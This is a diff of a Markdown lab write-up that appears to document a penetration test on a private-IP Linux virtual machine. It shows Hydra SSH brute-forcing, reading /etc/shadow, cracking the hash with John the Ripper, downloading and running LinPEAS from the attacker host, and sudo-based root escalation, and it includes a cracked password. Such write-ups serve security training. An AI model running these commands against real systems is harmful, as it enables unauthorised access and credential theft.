@@ -18,15 +18,15 @@ target.
 **Tool:** Hydra
 **Goal:** Brute-force SSH credentials on the target.
 
-\`\`\`bash
+```bash
 hydra -l nawal -P ~/custom.txt ssh://192.168.219.129
-\`\`\`
+```
 
 **Result:**
-\`\`\`
+```
 [22][ssh] host: 192.168.219.129   login: nawal   password: cyber@2.0
 1 of 1 target successfully completed, 1 valid password found
-\`\`\`
+```
 
 ![Hydra SSH Bruteforce](screenshots/01-hydra-ssh-bruteforce.png)
 
@@ -41,17 +41,17 @@ wordlist.
 Logged into the target via the cracked credentials and extracted the
 password hash from the shadow file.
 
-\`\`\`bash
+```bash
 ssh nawal@192.168.219.129
 sudo cat /etc/shadow | grep nawal
-\`\`\`
+```
 
 Hash securely transferred back to the attacker machine via `scp` to avoid
 transcription errors:
 
-\`\`\`bash
+```bash
 scp nawal@192.168.219.129:~/myhash.txt ~/hash.txt
-\`\`\`
+```
 
 ![Shadow Hash Extraction](screenshots/02-shadow-hash-extraction.png)
 
@@ -62,16 +62,16 @@ scp nawal@192.168.219.129:~/myhash.txt ~/hash.txt
 **Tool:** John the Ripper
 **Goal:** Crack the extracted hash offline to confirm the password.
 
-\`\`\`bash
+```bash
 john --wordlist=~/mypass.txt ~/hash.txt
 john --show ~/hash.txt
-\`\`\`
+```
 
 **Result:**
-\`\`\`
+```
 cyber@2.0    (nawal)
 1 password hash cracked, 0 left
-\`\`\`
+```
 
 ![John the Ripper Crack](screenshots/03-john-the-ripper-crack.png)
 
@@ -85,21 +85,21 @@ offline attacks.
 
 Manual enumeration performed after gaining shell access:
 
-\`\`\`bash
+```bash
 whoami
 id
 sudo -l
 find / -perm -4000 -type f 2>/dev/null
-\`\`\`
+```
 
 Automated enumeration performed using **LinPEAS**:
 
-\`\`\`bash
+```bash
 wget http://192.168.219.128:80/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh > linpeas_output.txt
 less -R linpeas_output.txt
-\`\`\`
+```
 
 ![LinPEAS Enumeration](screenshots/04-linpeas-enumeration.png)
 
@@ -114,17 +114,17 @@ less -R linpeas_output.txt
 
 **Vulnerability:** Sudoers misconfiguration.
 
-\`\`\`
+```
 User nawal may run the following commands on nawal-VMware-Virtual-Platform:
     (ALL : ALL) ALL
-\`\`\`
+```
 
 **Exploitation:**
-\`\`\`bash
+```bash
 sudo su
 whoami   # root
 id       # uid=0(root) gid=0(root) groups=0(root)
-\`\`\`
+```
 
 ![Root Privilege Escalation](screenshots/05-root-privilege-escalation.png)
 
